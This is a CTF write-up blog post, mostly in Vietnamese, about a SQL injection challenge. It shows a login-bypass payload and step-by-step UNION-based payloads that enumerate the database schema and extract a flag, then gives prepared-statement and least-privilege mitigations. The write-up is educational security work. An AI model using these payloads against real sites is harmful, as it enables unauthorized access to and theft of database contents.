+++
title = '[CTF Write-up] SQL Injection - Basic to Advanced'
date = '2026-05-10T14:00:00+07:00'
draft = false
tags = ['ctf', 'writeup', 'web', 'sql-injection']
categories = ['CTF Write-ups', 'Web Security']
+++

## Challenge Information

- **CTF**: CyberKnight CTF 2025
- **Category**: Web Exploitation
- **Difficulty**: Medium
- **Points**: 300
- **Solves**: 45/200 teams

## Description

```
Chúng tôi phát hiện một trang web đăng nhập có vẻ không an toàn.
Hãy tìm cách bypass authentication và lấy flag!

URL: http://challenge.cyberknight.vn:8080
```

## Initial Analysis

Khi truy cập vào trang web, chúng ta thấy một form đăng nhập đơn giản:

```html
<form method="POST" action="/login">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Login</button>
</form>
```

### Testing for SQL Injection

Thử payload cơ bản:
```
Username: admin' OR '1'='1
Password: anything
```

**Kết quả**: Error message xuất hiện!
```
SQL Error: You have an error in your SQL syntax...
```

Điều này xác nhận trang web dễ bị tấn công SQL Injection.

## Exploitation

### Step 1: Bypass Authentication

Sử dụng payload classic:
```sql
Username: admin' OR '1'='1' --
Password: (bỏ trống)
```

**Giải thích**:
- `admin'` đóng string trong query
- `OR '1'='1'` luôn đúng
- `--` comment phần còn lại của query

Query backend có thể trông như:
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' -- ' AND password='...'
```

### Step 2: Enumerate Database

Sau khi bypass login, chúng ta cần tìm flag. Sử dụng UNION-based SQLi:

```sql
' UNION SELECT 1,2,3,4,5 --
```

Thử từng số column cho đến khi không còn error. Giả sử có 5 columns.

### Step 3: Extract Database Information

```sql
' UNION SELECT 1,database(),user(),version(),5 --
```

**Output**:
```
Database: ctf_db
User: ctf_user@localhost
Version: 8.0.32
```

### Step 4: List Tables

```sql
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema='ctf_db' --
```

**Tables found**:
- users
- admin_panel
- secret_flags

### Step 5: Extract Flag

```sql
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='secret_flags' --
```

**Columns**:
- id
- flag_content
- description

Final payload:
```sql
' UNION SELECT 1,flag_content,3,4,5 FROM secret_flags --
```

## Flag

```
CyberKnight{SQL_1nj3ct10n_1s_st1ll_d4ng3r0us_2025}
```

## Mitigation

### 1. Prepared Statements (Recommended)

**Python (Flask + SQLAlchemy)**:
```python
from sqlalchemy import text

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Safe: Using parameterized query
    query = text("SELECT * FROM users WHERE username=:user AND password=:pass")
    result = db.session.execute(query, {"user": username, "pass": password})
    
    if result.fetchone():
        return "Login successful"
    return "Login failed"
```

**PHP (PDO)**:
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

### 2. Input Validation

```python
import re

def validate_username(username):
    # Only allow alphanumeric and underscore
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        return False
    return True
```

### 3. Least Privilege Principle

```sql
-- Tạo user với quyền hạn chế
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON database.users TO 'app_user'@'localhost';
-- Không cho quyền truy cập information_schema
```

### 4. Web Application Firewall (WAF)

Sử dụng ModSecurity hoặc cloud WAF để filter các pattern SQL injection.

## Lessons Learned

1. **Never trust user input**: Luôn validate và sanitize
2. **Use parameterized queries**: Tránh string concatenation
3. **Principle of least privilege**: Database user chỉ có quyền cần thiết
4. **Error handling**: Không hiển thị SQL errors cho users
5. **Security testing**: Regular penetration testing và code review

## Tools Used

- **Burp Suite**: Intercept và modify requests
- **SQLMap**: Automated SQL injection tool
- **Browser DevTools**: Analyze responses

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

**Difficulty Rating**: ⭐⭐⭐☆☆

Nếu bạn có câu hỏi về write-up này, hãy liên hệ: nhatran.network@gmail.com
